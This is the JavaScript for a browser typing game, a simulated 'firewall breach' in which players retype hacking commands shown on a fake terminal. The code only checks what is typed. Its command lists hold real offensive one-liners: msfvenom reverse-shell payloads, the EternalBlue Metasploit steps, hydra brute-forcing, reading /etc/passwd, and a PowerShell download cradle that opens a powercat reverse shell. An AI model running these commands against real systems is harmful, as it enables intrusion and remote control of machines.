
document.addEventListener('DOMContentLoaded', function() {
            const terminal = document.getElementById('terminal');
            const commandInput = document.getElementById('command-input');
            const startBtn = document.getElementById('start-btn');
            const resetBtn = document.getElementById('reset-btn');
            const timeLeft = document.getElementById('time-left');
            const commandsCompleted = document.getElementById('commands-completed');
            const firewallStrength = document.getElementById('firewall-strength');
            const breachProgress = document.getElementById('breach-progress');
            const progressText = document.getElementById('progress-text');
            const difficultyBtns = document.querySelectorAll('.difficulty-btn');
            const basicCommandsEl = document.getElementById('basic-commands');
            const advancedCommandsEl = document.getElementById('advanced-commands');
            const expertCommandsEl = document.getElementById('expert-commands');
            
            let gameActive = false;
            let timeRemaining = 30;
            let completedCommands = 0;
            let currentFirewallStrength = 100;
            let timerInterval;
            let currentDifficulty = "noob";
            
            // Difficulty settings
            const difficultySettings = {
                noob: {
                    totalCommands: 8,
                    basic: 3,
                    advanced: 3,
                    expert: 2,
                    startTime: 30
                },
                pro: {
                    totalCommands: 15,
                    basic: 4,
                    advanced: 6,
                    expert: 5,
                    startTime: 35
                },
                1337: {
                    totalCommands: 20,
                    basic: 4,
                    advanced: 8,
                    expert: 8,
                    startTime: 40
                }
            };
            
            // Commands organized by difficulty
            const commandPools = {
                easy: [
                    "nmap -sS 192.168.1.1",
                    "whoami",
                    "ifconfig",
                    "ping google.com",
                    "ls -la",
                    "cd /tmp",
                    "cat /etc/passwd",
                    "ps aux",
                    "netstat -tulpn",
                    "ssh user@host",
                    "tcpdump -D",
                    "wget http://test.com/file",
                    "curl -I http://test.com",
                    "find / -name password.txt",
                    "uname -a"
                ],
                medium: [
                    "nmap -sS -T4 192.168.1.0/24",
                    "hydra -l admin -p password ssh://target.com",
                    "sqlmap -u http://test.com/vuln.php?id=1",
                    "aircrack-ng -w wordlist.txt capture-01.cap",
                    "john --wordlist=passwords.txt hashfile",
                    "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe",
                    "use exploit/multi/handler",
                    "set payload windows/meterpreter/reverse_tcp",
                    "exploit",
                    "searchsploit apache 2.4",
                    "nikto -h http://target.com",
                    "gobuster dir -u http://target.com -w wordlist.txt",
                    "sqlmap -u http://test.com/vuln.php --dbs",
                    "hashcat -m 0 -a 0 hash.txt wordlist.txt",
                    "ettercap -T -M arp /192.168.1.1// /192.168.1.2//"
                ],
                hard: [
                    "nmap -sS -sV -O -T5 192.168.1.1-254",
                    "hydra -L users.txt -P passwords.txt -t 4 -W 3 -o results.txt ssh://192.168.1.1",
                    "sqlmap -u 'http://test.com/vuln.php?id=1' --dbms=mysql --technique=B --threads=5 --batch",
                    "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 3 > payload.exe",
                    "use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS 192.168.1.0/24; set THREADS 10; run",
                    "ettercap -T -M arp:remote /192.168.1.1// /192.168.1.5//",
                    "wifite -i wlan0 -mac -pow 50 -aircrack",
                    "metasploit; use exploit/windows/smb/ms17_010_eternalblue; set RHOST 192.168.1.10; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit",
                    "python3 -c 'import socket; s=socket.socket(); s.connect((\"192.168.1.1\", 80)); s.send(b\"GET / HTTP/1.1\\r\\nHost: 192.168.1.1\\r\\n\\r\\n\"); print(s.recv(1024))'",
                    "routersploit; use scanners/autopwn; set target 192.168.1.1; run",
                    "beef-xss; nano /usr/share/beef-xss/config.yaml; service beef-xss start",
                    "setoolkit; 1 (Social-Engineering Attacks); 2 (Website Attack Vectors); 3 (Credential Harvester Attack Method)",
                    "theharvester -d example.com -b google -l 100",
                    "maltego; new graph; add domain example.com; run transforms",
                    "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/powercat.ps1'); powercat -c 192.168.1.100 -p 4444 -e cmd\""
                ]
            };
            
            let currentCommand = "";
            let currentStage = "basic";
            let basicCompleted = 0;
            let advancedCompleted = 0;
            let expertCompleted = 0;
            
            function initGame() {
                const settings = difficultySettings[currentDifficulty];
                gameActive = true;
                timeRemaining = settings.startTime;
                completedCommands = 0;
                currentFirewallStrength = 100;
                basicCompleted = 0;
                advancedCompleted = 0;
                expertCompleted = 0;
                currentStage = "basic";
                
                timeLeft.textContent = timeRemaining;
                commandsCompleted.textContent = `0/${settings.totalCommands}`;
                firewallStrength.textContent = currentFirewallStrength + "%";
                breachProgress.style.width = "0%";
                progressText.textContent = "BREACH IN PROGRESS...";
                
                updateCommandStats();
                
                // ENABLE the input field
                commandInput.disabled = false;
                commandInput.placeholder = "Type the command and press ENTER...";
                commandInput.focus();
                
                // Clear previous game messages
                const terminalLines = terminal.querySelectorAll('.terminal-line');
                for (let i = 4; i < terminalLines.length - 1; i++) {
                    terminal.removeChild(terminalLines[i]);
                }
                
                addTerminalLine("root@theblackpacket:~#", `Starting ${currentDifficulty.toUpperCase()} firewall breach sequence...`, "system");
                addTerminalLine("root@theblackpacket:~#", "Firewall detected. Type commands quickly!", "warning");
                addTerminalLine("root@theblackpacket:~#", `Complete ${settings.totalCommands} commands to breach the firewall!`, "warning");
                addTerminalLine("root@theblackpacket:~#", "Each correct command adds +1 second for every 2 characters!", "success");
                
                generateNewCommand();
                
                timerInterval = setInterval(updateTimer, 1000);
            }
            
            function updateTimer() {
                timeRemaining--;
                timeLeft.textContent = timeRemaining;
                
                if (timeRemaining <= 0) {
                    endGame(false);
                }
            }
            
            function generateNewCommand() {
                let difficulty;
                const settings = difficultySettings[currentDifficulty];
                
                if (basicCompleted < settings.basic) {
                    difficulty = "easy";
                    currentStage = "basic";
                } else if (advancedCompleted < settings.advanced) {
                    difficulty = "medium";
                    currentStage = "advanced";
                } else {
                    difficulty = "hard";
                    currentStage = "expert";
                }
                
                const commandList = commandPools[difficulty];
                currentCommand = commandList[Math.floor(Math.random() * commandList.length)];
                
                let difficultyText = "";
                if (difficulty === "easy") difficultyText = " [BASIC]";
                else if (difficulty === "medium") difficultyText = " [ADVANCED]";
                else difficultyText = " [EXPERT]";
                
                addTerminalLine("firewall@securenet:~$ ", "Next command" + difficultyText + ": " + currentCommand, "system");
            }
            
            function checkCommand() {
                if (commandInput.value.trim() === currentCommand) {
                    // Calculate time bonus: +1 second for every 2 characters
                    const timeBonus = Math.floor(currentCommand.length / 2);
                    timeRemaining += timeBonus;
                    timeLeft.textContent = timeRemaining;
                    
                    // Update stage counters
                    const settings = difficultySettings[currentDifficulty];
                    if (currentStage === "basic") {
                        basicCompleted++;
                    } else if (currentStage === "advanced") {
                        advancedCompleted++;
                    } else {
                        expertCompleted++;
                    }
                    
                    completedCommands++;
                    commandsCompleted.textContent = `${completedCommands}/${settings.totalCommands}`;
                    
                    addTerminalLine("root@theblackpacket:~#", commandInput.value, "success");
                    addTerminalLine("firewall@securenet:~$ ", `Command executed successfully! +${timeBonus} seconds added!`, "time-bonus");
                    
                    currentFirewallStrength = 100 - ((completedCommands / settings.totalCommands) * 100);
                    if (currentFirewallStrength < 0) currentFirewallStrength = 0;
                    firewallStrength.textContent = Math.round(currentFirewallStrength) + "%";
                    
                    let progressPercent = (completedCommands / settings.totalCommands) * 100;
                    breachProgress.style.width = progressPercent + "%";
                    
                    updateCommandStats();
                    
                    if (completedCommands >= settings.totalCommands) {
                        endGame(true);
                        return;
                    }
                    
                    commandInput.value = "";
                    generateNewCommand();
                } else {
                    // Incorrect command
                    addTerminalLine("root@theblackpacket:~#", commandInput.value, "error");
                    addTerminalLine("firewall@securenet:~$ ", "ERROR: Command not recognized. Firewall strengthening!", "error");
                    
                    currentFirewallStrength += 5;
                    if (currentFirewallStrength > 100) currentFirewallStrength = 100;
                    firewallStrength.textContent = Math.round(currentFirewallStrength) + "%";
                    
                    commandInput.value = "";
                }
            }
            
            function updateCommandStats() {
                const settings = difficultySettings[currentDifficulty];
                basicCommandsEl.textContent = `Basic: ${basicCompleted}/${settings.basic}`;
                advancedCommandsEl.textContent = `Advanced: ${advancedCompleted}/${settings.advanced}`;
                expertCommandsEl.textContent = `Expert: ${expertCompleted}/${settings.expert}`;
            }
            
            function endGame(success) {
                gameActive = false;
                clearInterval(timerInterval);
                commandInput.disabled = true;
                commandInput.placeholder = "Game over - Click 'RESET SIMULATION' to play again";
                
                if (success) {
                    addTerminalLine("firewall@securenet:~$ ", "*** FIREWALL BREACHED ***", "success");
                    addTerminalLine("root@theblackpacket:~#", "Access granted to secure network. Mission accomplished!", "success");
                    progressText.textContent = "FIREWALL BREACHED - MISSION SUCCESS";
                    breachProgress.style.width = "100%";
                    breachProgress.style.background = "linear-gradient(to right, #003300, #00ff00)";
                } else {
                    addTerminalLine("firewall@securenet:~$ ", "*** INTRUSION DETECTED ***", "error");
                    addTerminalLine("root@theblackpacket:~#", "Firewall defenses held. Mission failed.", "error");
                    progressText.textContent = "FIREWALL DEFENSES ACTIVE - BREACH FAILED";
                    breachProgress.style.width = "0%";
                }
            }
            
            function addTerminalLine(prompt, text, className) {
                const line = document.createElement('div');
                line.className = 'terminal-line';
                
                const promptSpan = document.createElement('span');
                promptSpan.className = 'prompt';
                promptSpan.textContent = prompt;
                
                const textSpan = document.createElement('span');
                textSpan.className = className;
                textSpan.textContent = text;
                
                line.appendChild(promptSpan);
                line.appendChild(textSpan);
                
                // Insert before the input line
                terminal.insertBefore(line, document.getElementById('command-line'));
                
                // Scroll to bottom
                terminal.scrollTop = terminal.scrollHeight;
            }
            
            function resetGame() {
                gameActive = false;
                clearInterval(timerInterval);
                
                // Clear terminal except for initial lines and input line
                const terminalLines = terminal.querySelectorAll('.terminal-line');
                for (let i = 4; i < terminalLines.length - 1; i++) {
                    if (terminalLines[i].parentNode) {
                        terminal.removeChild(terminalLines[i]);
                    }
                }
                
                const settings = difficultySettings[currentDifficulty];
                timeLeft.textContent = settings.startTime;
                commandsCompleted.textContent = `0/${settings.totalCommands}`;
                firewallStrength.textContent = "100%";
                breachProgress.style.width = "0%";
                breachProgress.style.background = "linear-gradient(to right, #003300, #00aa00, #00ff00)";
                progressText.textContent = "SELECT DIFFICULTY AND INITIATE BREACH";
                commandInput.value = "";
                commandInput.disabled = true;
                commandInput.placeholder = "Select difficulty and click 'INITIATE BREACH'...";
                
                updateCommandStats();
            }
            
            // Event listeners
            startBtn.addEventListener('click', function() {
                if (!gameActive) {
                    initGame();
                }
            });
            
            resetBtn.addEventListener('click', resetGame);
            
            commandInput.addEventListener('keyup', function(event) {
                if (event.key === 'Enter' && gameActive) {
                    checkCommand();
                }
            });
            
            // Difficulty selector
            difficultyBtns.forEach(btn => {
                btn.addEventListener('click', function() {
                    difficultyBtns.forEach(b => b.classList.remove('active'));
                    this.classList.add('active');
                    currentDifficulty = this.getAttribute('data-difficulty');
                    resetGame();
                });
            });
            
            // Initialize with game inactive
            resetGame();
        });
    